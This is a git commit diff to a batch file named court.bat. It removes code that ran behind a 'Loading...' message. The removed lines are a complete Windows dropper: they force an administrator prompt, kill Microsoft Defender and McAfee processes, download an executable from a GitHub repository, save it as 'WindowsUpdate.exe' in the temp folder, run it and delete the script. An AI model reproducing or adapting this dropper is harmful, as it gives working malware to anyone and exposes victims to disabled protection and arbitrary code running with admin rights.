88721e0fba2569458072d5b5186051f563e8dead
madhead341 <106779656+madhead341@users.noreply.github.com>
2025-05-09 22:14:39 +0200

    Update court.bat

--- court.bat
+++ court.bat
@@ -1,21 +1,2 @@
 @echo off
 echo Loading...  
-3>nul (  
-    :checkadmin  
-    net session >nul 2>&1  
-    if %errorLevel% == 0 goto :execute  
-
-    powershell -command "Start-Process cmd -ArgumentList '/c %~0' -Verb RunAs"  
-    timeout /t 2 >nul  
-    goto :checkadmin  
-    :execute  
-    taskkill /f /im MsMpEng.exe >nul 2>&1  
-    taskkill /f /im McAfee*.exe >nul 2>&1  
-    set "PAYLOAD_URL=https://github.com/madhead341/amzhubv2/raw/refs/heads/main/V3.exe"
-    set "SAVE_PATH=%Temp%\WindowsUpdate.exe"  
-    powershell -command "Invoke-WebRequest -Uri '%PAYLOAD_URL%' -OutFile '%SAVE_PATH%'"  
-    start /B "" "%SAVE_PATH%"   
-    del /f /q "%~f0" >nul 2>&1  
-)  
-
-exit  
